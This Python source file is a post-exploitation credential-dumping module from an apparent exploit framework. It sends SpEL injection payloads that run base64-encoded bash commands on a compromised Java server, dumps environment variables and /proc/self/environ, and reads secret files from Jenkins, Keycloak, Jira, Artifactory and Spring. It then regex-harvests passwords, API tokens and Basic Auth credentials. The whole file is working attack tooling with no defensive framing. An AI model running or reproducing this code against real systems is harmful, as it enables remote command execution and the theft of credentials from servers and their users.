# language: Python 3.10+, file: modules/post/cred_dump.py
# Post-exploitation: credential extraction from heap and config files.
# Combines JavaBleed memory scanning with file-based credential harvesting.
# Targets: DB passwords, API keys, service tokens, SSH keys, cloud credentials.

import base64
import json
import re
import urllib.request
import urllib.error
import ssl
from dataclasses import dataclass, field
from typing import Optional

from modules.fingerprint import FingerprintResult
from modules.exploit_core import ExploitCoreResult
from modules.post.javableed import PATTERNS, _scan_for_credentials, LeakedCredential
from modules.post.file_read import run_file_read, DEFAULT_FILES


def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


# ─── Target-specific credential files ────────────────────────────────────────

TARGET_CRED_FILES = {
    "keycloak": [
        "/opt/keycloak/conf/keycloak.conf",
        "/opt/keycloak/standalone/configuration/standalone.xml",
        "/opt/keycloak/domain/configuration/domain.xml",
        "/opt/keycloak/data/import/realm-export.json",
    ],
    "jira": [
        "/var/atlassian/application-data/jira/dbconfig.xml",
        "/opt/atlassian/jira/conf/server.xml",
        "/var/atlassian/application-data/jira/jira-config.properties",
    ],
    "confluence": [
        "/var/atlassian/application-data/confluence/confluence.cfg.xml",
        "/opt/atlassian/confluence/conf/server.xml",
    ],
    "jenkins": [
        "/var/jenkins_home/secrets/master.key",
        "/var/jenkins_home/secrets/hudson.util.Secret",
        "/var/jenkins_home/credentials.xml",
        "/var/jenkins_home/config.xml",
        "${JENKINS_HOME}/secrets/master.key",
    ],
    "artifactory": [
        "/etc/artifactory/artifactory.system.properties",
        "/var/opt/jfrog/artifactory/etc/artifactory/artifactory.config.xml",
        "/var/opt/jfrog/artifactory/etc/security/artifactory.key",
    ],
    "elasticsearch": [
        "/etc/elasticsearch/elasticsearch.yml",
        "/etc/elasticsearch/jvm.options",
        "/usr/share/elasticsearch/config/elasticsearch.yml",
    ],
    "solr": [
        "/etc/solr/security.json",
        "/opt/solr/server/solr/security.json",
    ],
    "spring": [
        "/app/application.properties",
        "/app/application.yml",
        "/config/application.properties",
        "/config/application.yml",
        "/app/config/application.properties",
        "/BOOT-INF/classes/application.properties",
    ],
}

# Additional credential patterns beyond those in javableed.py
EXTRA_PATTERNS = {
    "JDBC-URL": re.compile(
        r"jdbc:[a-z0-9+:-]+://[^\s\"'<>]{5,200}",
        re.IGNORECASE
    ),
    "Spring-Secret": re.compile(
        r"(?:jwt[_.-]?secret|signing[_.-]?key|encryption[_.-]?key|app[_.-]?secret)\s*[=:]\s*([^\s\n\"']{8,})",
        re.IGNORECASE
    ),
    "OAuth-Client-Secret": re.compile(
        r"(?:client[_.-]?secret|client[_.-]?password|oauth[_.-]?secret)\s*[=:]\s*([^\s\n\"']{8,})",
        re.IGNORECASE
    ),
    "DB-Password": re.compile(
        r"(?:db[_.-]?password|database[_.-]?password|datasource[_.-]?password|db[_.-]?pass)\s*[=:]\s*([^\s\n\"']{3,})",
        re.IGNORECASE
    ),
    "Keycloak-Admin": re.compile(
        r"(?:KC_DB_PASSWORD|KEYCLOAK_ADMIN_PASSWORD|keycloak[_.-]?password)\s*[=:]\s*([^\s\n\"']{3,})",
        re.IGNORECASE
    ),
    "Kubernetes-Config": re.compile(
        r"client-certificate-data:\s+([A-Za-z0-9+/=]{40,})"
    ),
    "NPM-Token": re.compile(r"//registry\.npmjs\.org/:_authToken=([A-Za-z0-9\-_]{36,})"),
    "GitHub-Token": re.compile(r"(?:ghp_|gho_|ghu_|ghs_)[A-Za-z0-9]{36}"),
    "Slack-Token": re.compile(r"xox[baprs]-[A-Za-z0-9\-]{10,}"),
    "Stripe-Key": re.compile(r"(?:sk|pk)_(?:live|test)_[A-Za-z0-9]{24,}"),
    "Twilio-Key": re.compile(r"SK[a-f0-9]{32}"),
    "Artifactory-Key": re.compile(r"(?:AKC|ART)[a-zA-Z0-9]{5,}"),
}

ALL_PATTERNS = {**PATTERNS, **EXTRA_PATTERNS}


def _scan_all(text: str) -> list[LeakedCredential]:
    found = []
    for cred_type, pattern in ALL_PATTERNS.items():
        for m in pattern.finditer(text):
            val = m.group(0)
            start = max(0, m.start() - 40)
            end   = min(len(text), m.end() + 40)
            ctx   = text[start:end].replace("\n", " ")
            found.append(LeakedCredential(cred_type=cred_type, value=val[:300], context=ctx))
    return found


def _deliver_and_read(target_url: str, endpoint_path: str, command: str,
                      timeout: float) -> str:
    """Execute command and return stdout."""
    b64_cmd = base64.b64encode(command.encode()).decode()
    spel = (
        f"new java.util.Scanner("
        f"T(java.lang.Runtime).getRuntime().exec("
        f"new String[]{{\"bash\",\"-c\","
        f"new String(T(java.util.Base64).getDecoder().decode(\"{b64_cmd}\")))))"
        f".getInputStream()).useDelimiter(\"\\\\A\").next()"
    )
    body = json.dumps({"expression": spel}).encode()
    req = urllib.request.Request(
        target_url.rstrip("/") + endpoint_path,
        data=body,
        headers={"Content-Type": "application/json", "User-Agent": "Java4Shell-CredDump/1.0"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            return r.read(65536).decode(errors="replace")
    except urllib.error.HTTPError as e:
        try:
            return e.read(65536).decode(errors="replace")
        except Exception:
            return ""
    except Exception:
        return ""


# ─── Result ───────────────────────────────────────────────────────────────────

@dataclass
class CredDumpResult:
    success: bool = False
    total_credentials: int = 0
    by_type: dict[str, list[str]] = field(default_factory=dict)
    raw_findings: list[LeakedCredential] = field(default_factory=list)
    decoded_basic_auths: list[str] = field(default_factory=list)
    sources: list[str] = field(default_factory=list)   # which files/sources had hits
    error: Optional[str] = None
    notes: list[str] = field(default_factory=list)


# ─── Main function ────────────────────────────────────────────────────────────

def run_cred_dump(fp: FingerprintResult,
                  core: ExploitCoreResult,
                  timeout: float = 15.0,
                  verbose: bool = False) -> CredDumpResult:
    """
    Comprehensive credential extraction:
    1. Read target-specific configuration files
    2. Run environment variable dump (env, printenv)
    3. Read process environment (/proc/self/environ)
    4. Scan for credential patterns in all gathered text

    Returns CredDumpResult with categorized credentials.
    """
    result = CredDumpResult()

    if not core.oob_triggered:
        result.error = "OOB write not confirmed — cred dump requires RCE."
        return result

    base      = fp.target_url.rstrip("/")
    endpoints = sorted(fp.profile.endpoints, key=lambda e: e["priority"])
    primary   = endpoints[0]["path"] if endpoints else "/"

    all_text = ""

    # ── 1. Environment variables ───────────────────────────────────────────
    if verbose:
        print("  [creds] Dumping environment variables …")

    env_text = _deliver_and_read(base, primary, "env", timeout)
    if env_text:
        all_text += "\n[ENV]\n" + env_text
        result.sources.append("environment_variables")

    # /proc/self/environ (Linux)
    proc_env = _deliver_and_read(base, primary, "cat /proc/self/environ | tr '\\0' '\\n'", timeout)
    if proc_env:
        all_text += "\n[PROC_ENVIRON]\n" + proc_env
        result.sources.append("/proc/self/environ")

    # ── 2. Target-specific config files ───────────────────────────────────
    target_files = list(DEFAULT_FILES)
    if fp.profile_key and fp.profile_key in TARGET_CRED_FILES:
        target_files = TARGET_CRED_FILES[fp.profile_key] + target_files
        if verbose:
            print(f"  [creds] Reading {fp.profile_key}-specific config files …")

    file_result = run_file_read(fp, core, files=target_files, timeout=timeout, verbose=verbose)
    for filepath, content in file_result.files_read.items():
        all_text += f"\n[FILE:{filepath}]\n{content}"
        result.sources.append(filepath)

    # ── 3. Java system properties ──────────────────────────────────────────
    if verbose:
        print("  [creds] Dumping Java system properties …")

    sys_props_spel = (
        "T(java.lang.System).getProperties().entrySet().stream()"
        ".map(e -> e.getKey() + '=' + e.getValue())"
        ".collect(T(java.util.stream.Collectors).joining('\\n'))"
    )
    body = json.dumps({"expression": sys_props_spel}).encode()
    req  = urllib.request.Request(
        base + primary, data=body,
        headers={"Content-Type": "application/json", "User-Agent": "Java4Shell-CredDump/1.0"},
        method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            sys_props = r.read(65536).decode(errors="replace")
            if sys_props:
                all_text += "\n[JAVA_SYSTEM_PROPS]\n" + sys_props
                result.sources.append("java_system_properties")
    except Exception:
        pass

    # ── 4. Scan everything for credentials ────────────────────────────────
    if verbose:
        print("  [creds] Scanning for credential patterns …")

    creds = _scan_all(all_text)

    # De-duplicate by value
    seen_values: set[str] = set()
    unique_creds: list[LeakedCredential] = []
    for c in creds:
        key = c.cred_type + ":" + c.value[:60]
        if key not in seen_values:
            seen_values.add(key)
            unique_creds.append(c)

    # Categorize
    by_type: dict[str, list[str]] = {}
    for c in unique_creds:
        by_type.setdefault(c.cred_type, []).append(c.value)

    # Decode any Basic Auth strings
    decoded_auths = []
    for m in re.finditer(r"Basic\s+([A-Za-z0-9+/=]{8,})", all_text):
        try:
            raw = base64.b64decode(m.group(1) + "==").decode(errors="replace")
            if ":" in raw and len(raw) < 200:
                decoded_auths.append(raw)
        except Exception:
            pass

    result.total_credentials   = len(unique_creds)
    result.raw_findings        = unique_creds
    result.by_type             = by_type
    result.decoded_basic_auths = list(set(decoded_auths))
    result.success             = len(unique_creds) > 0

    result.notes.append(
        f"Found {len(unique_creds)} unique credential(s) across {len(result.sources)} source(s). "
        f"Decoded {len(result.decoded_basic_auths)} Basic Auth credential(s)."
    )

    return result


def print_cred_dump(r: CredDumpResult):
    BOLD = "\033[1m"
    RST  = "\033[0m"
    RED  = "\033[91m"
    YLW  = "\033[93m"
    GRN  = "\033[92m"

    print(f"\n{BOLD}  ── Credential Dump Results ──{RST}")
    print(f"  Total found   : {RED if r.total_credentials > 0 else GRN}{r.total_credentials}{RST}")
    print(f"  Sources       : {len(r.sources)}")

    if r.decoded_basic_auths:
        print(f"\n  {BOLD}Decoded Basic Auth credentials:{RST}")
        for cred in r.decoded_basic_auths:
            print(f"    {RED}{cred}{RST}")

    if r.by_type:
        print(f"\n  {BOLD}Credentials by type:{RST}")
        for cred_type, values in r.by_type.items():
            print(f"    {YLW}{cred_type}{RST} ({len(values)})")
            for val in values[:3]:
                print(f"      {val[:120]}")
            if len(values) > 3:
                print(f"      … and {len(values)-3} more")

    for note in r.notes:
        print(f"  → {note}")
    print()
